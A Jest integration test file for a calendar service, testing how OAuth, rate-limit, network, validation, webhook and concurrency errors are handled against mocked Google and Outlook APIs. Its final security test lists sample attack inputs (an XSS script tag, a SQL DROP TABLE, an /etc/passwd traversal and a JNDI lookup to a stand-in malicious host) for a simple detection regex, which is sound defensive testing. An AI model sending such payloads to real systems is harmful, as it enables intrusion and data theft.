/**
 * Error Scenarios Integration Tests
 * Testing & QA Engineer - Comprehensive error handling and edge case testing
 */

const CalendarService = require('../../services/../../../src/followup/services/calendar.service');
const moment = require('moment-timezone');

// Mock external dependencies
jest.mock('googleapis');
jest.mock('@azure/microsoft-graph-client');

describe('Error Scenarios Integration Tests', () => {
  let mockGoogleCalendar;
  let mockOutlookClient;
  let mockGoogleAuth;
  
  beforeAll(async () => {
    // Mock Google OAuth
    mockGoogleAuth = {
      generateAuthUrl: jest.fn(),
      getToken: jest.fn(),
      setCredentials: jest.fn(),
      refreshAccessToken: jest.fn()
    };
    
    const { google } = require('googleapis');
    google.auth.OAuth2.mockImplementation(() => mockGoogleAuth);
    
    // Mock Google Calendar API
    mockGoogleCalendar = {
      events: {
        insert: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        get: jest.fn()
      },
      freebusy: {
        query: jest.fn()
      }
    };
    
    google.calendar = jest.fn().mockReturnValue(mockGoogleCalendar);
    
    // Mock Microsoft Graph Client
    mockOutlookClient = {
      api: jest.fn().mockReturnThis(),
      post: jest.fn(),
      patch: jest.fn(),
      delete: jest.fn(),
      get: jest.fn()
    };
    
    const graphClient = require('@azure/microsoft-graph-client');
    graphClient.Client = {
      init: jest.fn(() => mockOutlookClient)
    };
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('OAuth Token Errors', () => {
    it('should handle expired access tokens', async () => {
      const expiredTokens = {
        access_token: 'expired_token',
        refresh_token: 'valid_refresh_token',
        expiry_date: Date.now() - 1000 // Expired 1 second ago
      };

      // Mock expired token error
      const expiredError = new Error('Invalid Credentials');
      expiredError.code = 401;
      expiredError.errors = [{ reason: 'authError', message: 'Invalid Credentials' }];
      
      mockGoogleCalendar.events.insert.mockRejectedValue(expiredError);

      // Mock successful token refresh
      mockGoogleAuth.refreshAccessToken.mockResolvedValue({
        credentials: {
          access_token: 'new_access_token',
          refresh_token: 'valid_refresh_token',
          expiry_date: Date.now() + 3600000
        }
      });

      const eventData = {
        title: 'Test expired token',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google', expiredTokens)
      ).rejects.toThrow('Invalid Credentials');

      expect(mockGoogleCalendar.events.insert).toHaveBeenCalled();
    });

    it('should handle invalid refresh tokens', async () => {
      const invalidTokens = {
        access_token: 'expired_token',
        refresh_token: 'invalid_refresh_token',
        expiry_date: Date.now() - 1000
      };

      const refreshError = new Error('invalid_grant');
      refreshError.code = 400;
      
      mockGoogleAuth.refreshAccessToken.mockRejectedValue(refreshError);

      await expect(async () => {
        await mockGoogleAuth.refreshAccessToken();
      }).rejects.toThrow('invalid_grant');
    });

    it('should handle revoked authorization', async () => {
      const revokedError = new Error('Unauthorized');
      revokedError.code = 401;
      revokedError.errors = [{ reason: 'unauthorized', message: 'Unauthorized' }];
      
      mockGoogleCalendar.events.insert.mockRejectedValue(revokedError);

      const eventData = {
        title: 'Test revoked auth',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('Unauthorized');
    });

    it('should handle malformed token responses', async () => {
      const malformedTokens = {
        // Missing required fields
        token_type: 'Bearer'
        // Missing access_token, refresh_token
      };

      await expect(async () => {
        if (!malformedTokens.access_token) {
          throw new Error('Invalid token format: missing access_token');
        }
      }).rejects.toThrow('Invalid token format: missing access_token');
    });
  });

  describe('API Rate Limiting Errors', () => {
    it('should handle Google Calendar rate limits', async () => {
      const rateLimitError = new Error('Rate Limit Exceeded');
      rateLimitError.code = 429;
      rateLimitError.errors = [{
        reason: 'rateLimitExceeded',
        message: 'Rate Limit Exceeded'
      }];

      mockGoogleCalendar.events.insert.mockRejectedValue(rateLimitError);

      const eventData = {
        title: 'Rate limit test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('Rate Limit Exceeded');
    });

    it('should handle Outlook throttling', async () => {
      const throttleError = new Error('TooManyRequests');
      throttleError.code = 429;
      throttleError.statusCode = 429;

      mockOutlookClient.post.mockRejectedValue(throttleError);

      const eventData = {
        title: 'Throttling test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'outlook', { accessToken: 'valid_token' })
      ).rejects.toThrow('TooManyRequests');
    });

    it('should implement exponential backoff retry logic', async () => {
      let attempt = 0;
      const maxRetries = 3;

      mockGoogleCalendar.events.insert.mockImplementation(() => {
        attempt++;
        if (attempt <= maxRetries) {
          const retryError = new Error('Service Unavailable');
          retryError.code = 503;
          return Promise.reject(retryError);
        }
        return Promise.resolve({ data: { id: 'success_after_retries' } });
      });

      // Mock retry implementation (would be in actual service)
      const retryWithBackoff = async (fn, maxRetries = 3) => {
        let lastError;
        
        for (let i = 0; i <= maxRetries; i++) {
          try {
            return await fn();
          } catch (error) {
            lastError = error;
            if (i < maxRetries && [429, 503].includes(error.code)) {
              const delay = Math.min(1000 * Math.pow(2, i), 10000); // Cap at 10 seconds
              await new Promise(resolve => setTimeout(resolve, delay));
            }
          }
        }
        throw lastError;
      };

      const eventData = {
        title: 'Retry test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      const result = await retryWithBackoff(
        () => mockGoogleCalendar.events.insert({ resource: eventData })
      );

      expect(result.data.id).toBe('success_after_retries');
      expect(attempt).toBe(maxRetries + 1);
    });
  });

  describe('Network and Connectivity Errors', () => {
    it('should handle network timeouts', async () => {
      const timeoutError = new Error('Request timeout');
      timeoutError.code = 'ECONNABORTED';
      timeoutError.timeout = true;

      mockGoogleCalendar.events.insert.mockRejectedValue(timeoutError);

      const eventData = {
        title: 'Timeout test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('Request timeout');
    });

    it('should handle connection refused errors', async () => {
      const connectionError = new Error('Connection refused');
      connectionError.code = 'ECONNREFUSED';

      mockGoogleCalendar.events.insert.mockRejectedValue(connectionError);

      const eventData = {
        title: 'Connection test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('Connection refused');
    });

    it('should handle DNS resolution failures', async () => {
      const dnsError = new Error('DNS lookup failed');
      dnsError.code = 'ENOTFOUND';
      dnsError.hostname = 'www.googleapis.com';

      mockGoogleCalendar.events.insert.mockRejectedValue(dnsError);

      const eventData = {
        title: 'DNS test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('DNS lookup failed');
    });

    it('should handle SSL certificate errors', async () => {
      const sslError = new Error('SSL certificate error');
      sslError.code = 'CERT_HAS_EXPIRED';

      mockGoogleCalendar.events.insert.mockRejectedValue(sslError);

      const eventData = {
        title: 'SSL test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('SSL certificate error');
    });
  });

  describe('Data Validation Errors', () => {
    it('should handle invalid date formats', async () => {
      const eventData = {
        title: 'Invalid date test',
        startTime: 'invalid-date-format',
        duration: 30
      };

      // Mock validation error that would occur before API call
      const validateDate = (date) => {
        if (!moment(date).isValid()) {
          throw new Error('Invalid date format');
        }
      };

      expect(() => validateDate(eventData.startTime)).toThrow('Invalid date format');
    });

    it('should handle missing required fields', async () => {
      const incompleteEventData = {
        // Missing title and startTime
        duration: 30
      };

      const validationError = new Error('Missing required field: title');
      
      const validateRequired = (data) => {
        if (!data.title) throw new Error('Missing required field: title');
        if (!data.startTime) throw new Error('Missing required field: startTime');
      };

      expect(() => validateRequired(incompleteEventData)).toThrow('Missing required field: title');
    });

    it('should handle invalid email addresses', async () => {
      const eventData = {
        title: 'Email validation test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30,
        attendees: ['invalid-email', 'valid@example.com', '@missing-local.com']
      };

      const validateEmails = (attendees) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const invalidEmails = attendees.filter(email => !emailRegex.test(email));
        if (invalidEmails.length > 0) {
          throw new Error(`Invalid email addresses: ${invalidEmails.join(', ')}`);
        }
      };

      expect(() => validateEmails(eventData.attendees))
        .toThrow('Invalid email addresses: invalid-email, @missing-local.com');
    });

    it('should handle timezone validation', async () => {
      const eventData = {
        title: 'Timezone test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30,
        timezone: 'Invalid/Timezone'
      };

      const validateTimezone = (timezone) => {
        if (!moment.tz.zone(timezone)) {
          throw new Error(`Invalid timezone: ${timezone}`);
        }
      };

      expect(() => validateTimezone(eventData.timezone))
        .toThrow('Invalid timezone: Invalid/Timezone');
    });

    it('should handle duration limits', async () => {
      const eventData = {
        title: 'Duration test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 1440 * 7 // 7 days in minutes
      };

      const validateDuration = (duration) => {
        if (duration > 1440) { // More than 24 hours
          throw new Error('Duration cannot exceed 24 hours');
        }
      };

      expect(() => validateDuration(eventData.duration))
        .toThrow('Duration cannot exceed 24 hours');
    });
  });

  describe('Calendar Provider Errors', () => {
    it('should handle Google Calendar API errors', async () => {
      const googleApiError = new Error('Calendar not found');
      googleApiError.code = 404;
      googleApiError.errors = [{
        domain: 'calendar',
        reason: 'notFound',
        message: 'Calendar not found'
      }];

      mockGoogleCalendar.events.insert.mockRejectedValue(googleApiError);

      const eventData = {
        title: 'Calendar not found test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('Calendar not found');
    });

    it('should handle Outlook Graph API errors', async () => {
      const outlookError = new Error('Forbidden');
      outlookError.code = 403;
      outlookError.statusCode = 403;
      outlookError.message = 'Insufficient privileges to complete the operation';

      mockOutlookClient.post.mockRejectedValue(outlookError);

      const eventData = {
        title: 'Outlook permission test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'outlook', { accessToken: 'limited_token' })
      ).rejects.toThrow('Forbidden');
    });

    it('should handle unsupported calendar providers', () => {
      const eventData = {
        title: 'Unsupported provider test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      expect(() => {
        CalendarService.createEvent(eventData, 'yahoo'); // Unsupported provider
      }).toThrow('Unsupported calendar provider: yahoo');
    });
  });

  describe('Webhook Error Handling', () => {
    it('should handle malformed webhook payloads', () => {
      const malformedPayloads = [
        null,
        undefined,
        '',
        'invalid json',
        { /* missing required fields */ },
        { event: null, data: {} },
        { event: '', data: null }
      ];

      malformedPayloads.forEach(payload => {
        const validateWebhook = (payload) => {
          if (!payload || typeof payload !== 'object') {
            throw new Error('Invalid webhook payload');
          }
          if (!payload.event || typeof payload.event !== 'string') {
            throw new Error('Missing or invalid event type');
          }
          if (!payload.data) {
            throw new Error('Missing webhook data');
          }
        };

        if (payload === null || payload === undefined) {
          expect(() => validateWebhook(payload)).toThrow('Invalid webhook payload');
        } else if (typeof payload === 'string') {
          expect(() => validateWebhook(payload)).toThrow('Invalid webhook payload');
        } else if (!payload.event) {
          expect(() => validateWebhook(payload)).toThrow('Missing or invalid event type');
        } else if (!payload.data) {
          expect(() => validateWebhook(payload)).toThrow('Missing webhook data');
        }
      });
    });

    it('should handle webhook signature validation failures', () => {
      const payload = { event: 'test.event', data: { id: '123' } };
      const invalidSignatures = [
        null,
        undefined,
        '',
        'invalid-signature',
        'sha256=wrong-hash'
      ];

      const validateSignature = (payload, signature, secret) => {
        if (!signature) {
          throw new Error('Missing webhook signature');
        }
        
        const crypto = require('crypto');
        const expectedHash = crypto
          .createHmac('sha256', secret)
          .update(JSON.stringify(payload))
          .digest('hex');
        
        const receivedHash = signature.replace('sha256=', '');
        
        if (expectedHash !== receivedHash) {
          throw new Error('Invalid webhook signature');
        }
      };

      invalidSignatures.forEach(signature => {
        if (!signature) {
          expect(() => validateSignature(payload, signature, 'test-secret'))
            .toThrow('Missing webhook signature');
        } else {
          expect(() => validateSignature(payload, signature, 'test-secret'))
            .toThrow('Invalid webhook signature');
        }
      });
    });

    it('should handle webhook processing timeouts', async () => {
      const slowWebhookProcessor = async (payload) => {
        return new Promise((resolve, reject) => {
          setTimeout(() => {
            resolve({ processed: true });
          }, 5000); // 5 second delay
        });
      };

      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Webhook processing timeout')), 3000);
      });

      const payload = { event: 'slow.processing', data: { id: 'timeout_test' } };

      await expect(
        Promise.race([slowWebhookProcessor(payload), timeoutPromise])
      ).rejects.toThrow('Webhook processing timeout');
    });
  });

  describe('Memory and Resource Errors', () => {
    it('should handle memory pressure scenarios', async () => {
      // Simulate large event data
      const largeEventData = {
        title: 'Memory pressure test',
        description: 'A'.repeat(1000000), // 1MB description
        startTime: moment().add(1, 'day').toDate(),
        duration: 30,
        attendees: Array.from({ length: 10000 }, (_, i) => `attendee${i}@example.com`)
      };

      // Mock memory error
      const memoryError = new Error('JavaScript heap out of memory');
      memoryError.code = 'ERR_OUT_OF_MEMORY';

      mockGoogleCalendar.events.insert.mockImplementation((data) => {
        // Simulate memory check
        if (JSON.stringify(data).length > 500000) { // ~500KB limit
          return Promise.reject(memoryError);
        }
        return Promise.resolve({ data: { id: 'small_event' } });
      });

      await expect(
        mockGoogleCalendar.events.insert({ resource: largeEventData })
      ).rejects.toThrow('JavaScript heap out of memory');
    });

    it('should handle file system errors', async () => {
      const fsError = new Error('ENOSPC: no space left on device');
      fsError.code = 'ENOSPC';

      // Mock file system operation (e.g., logging)
      const writeLogFile = () => {
        throw fsError;
      };

      expect(() => writeLogFile()).toThrow('ENOSPC: no space left on device');
    });

    it('should handle database connection failures', async () => {
      const dbError = new Error('Connection terminated unexpectedly');
      dbError.code = 'ECONNRESET';

      // Mock database operation
      const dbOperation = () => Promise.reject(dbError);

      await expect(dbOperation()).rejects.toThrow('Connection terminated unexpectedly');
    });
  });

  describe('Concurrent Operation Errors', () => {
    it('should handle race conditions in calendar operations', async () => {
      const eventId = 'concurrent_event_123';

      // Mock concurrent update operations
      let updateCount = 0;
      mockGoogleCalendar.events.update.mockImplementation(() => {
        updateCount++;
        if (updateCount > 1) {
          const conflictError = new Error('Conflict: Event was modified by another request');
          conflictError.code = 409;
          return Promise.reject(conflictError);
        }
        return Promise.resolve({ data: { id: eventId, updated: true } });
      });

      // Simulate concurrent updates
      const update1 = mockGoogleCalendar.events.update({ eventId, resource: { title: 'Update 1' } });
      const update2 = mockGoogleCalendar.events.update({ eventId, resource: { title: 'Update 2' } });

      const results = await Promise.allSettled([update1, update2]);

      expect(results[0].status).toBe('fulfilled');
      expect(results[1].status).toBe('rejected');
      expect(results[1].reason.message).toContain('Conflict: Event was modified');
    });

    it('should handle deadlock scenarios', async () => {
      // Mock deadlock detection
      const deadlockError = new Error('Deadlock detected');
      deadlockError.code = 'DEADLOCK';

      // Simulate competing resource access
      const resource1 = { locked: false, id: 'resource_1' };
      const resource2 = { locked: false, id: 'resource_2' };

      const lockResources = (r1, r2) => {
        if (r1.locked || r2.locked) {
          throw deadlockError;
        }
        r1.locked = true;
        r2.locked = true;
      };

      resource1.locked = true; // Pre-lock to simulate deadlock

      expect(() => lockResources(resource1, resource2))
        .toThrow('Deadlock detected');
    });
  });

  describe('Graceful Degradation', () => {
    it('should provide fallback when primary service fails', async () => {
      const primaryError = new Error('Primary service unavailable');
      primaryError.code = 503;

      const fallbackService = {
        createEvent: jest.fn().mockResolvedValue({
          id: 'fallback_event',
          provider: 'fallback',
          success: true
        })
      };

      // Mock primary service failure
      mockGoogleCalendar.events.insert.mockRejectedValue(primaryError);

      const eventData = {
        title: 'Fallback test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      // Simulate fallback logic
      let result;
      try {
        await CalendarService.createEvent(eventData, 'google');
      } catch (error) {
        if (error.code === 503) {
          result = await fallbackService.createEvent(eventData);
        }
      }

      expect(result.provider).toBe('fallback');
      expect(result.success).toBe(true);
    });

    it('should maintain partial functionality during service degradation', async () => {
      // Mock partial service availability
      const partiallyAvailableService = {
        createEvent: jest.fn().mockRejectedValue(new Error('Service unavailable')),
        getEvent: jest.fn().mockResolvedValue({ id: 'existing_event' }),
        listEvents: jest.fn().mockResolvedValue({ events: [] })
      };

      // Test that read operations still work when write operations fail
      const readResult = await partiallyAvailableService.getEvent('test_id');
      expect(readResult.id).toBe('existing_event');

      await expect(partiallyAvailableService.createEvent({}))
        .rejects.toThrow('Service unavailable');
    });
  });

  describe('Security Error Scenarios', () => {
    it('should handle invalid API keys', async () => {
      const invalidKeyError = new Error('Invalid API key');
      invalidKeyError.code = 401;

      mockGoogleCalendar.events.insert.mockRejectedValue(invalidKeyError);

      const eventData = {
        title: 'Invalid key test',
        startTime: moment().add(1, 'day').toDate(),
        duration: 30
      };

      await expect(
        CalendarService.createEvent(eventData, 'google')
      ).rejects.toThrow('Invalid API key');
    });

    it('should handle CSRF token validation failures', () => {
      const csrfError = new Error('CSRF token validation failed');
      csrfError.code = 403;

      const validateCSRF = (token, expectedToken) => {
        if (token !== expectedToken) {
          throw csrfError;
        }
      };

      expect(() => validateCSRF('invalid_token', 'valid_token'))
        .toThrow('CSRF token validation failed');
    });

    it('should handle injection attack attempts', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE events;',
        '../../etc/passwd',
        '${jndi:ldap://malicious.com/a}'
      ];

      const sanitizeInput = (input) => {
        const dangerous = /<script|javascript:|on\w+=/i.test(input) ||
                        /drop\s+table|delete\s+from|insert\s+into/i.test(input) ||
                        /\.\.\//g.test(input) ||
                        /\$\{.*\}/g.test(input);
        
        if (dangerous) {
          throw new Error('Potentially malicious input detected');
        }
        return input;
      };

      maliciousInputs.forEach(input => {
        expect(() => sanitizeInput(input))
          .toThrow('Potentially malicious input detected');
      });
    });
  });
});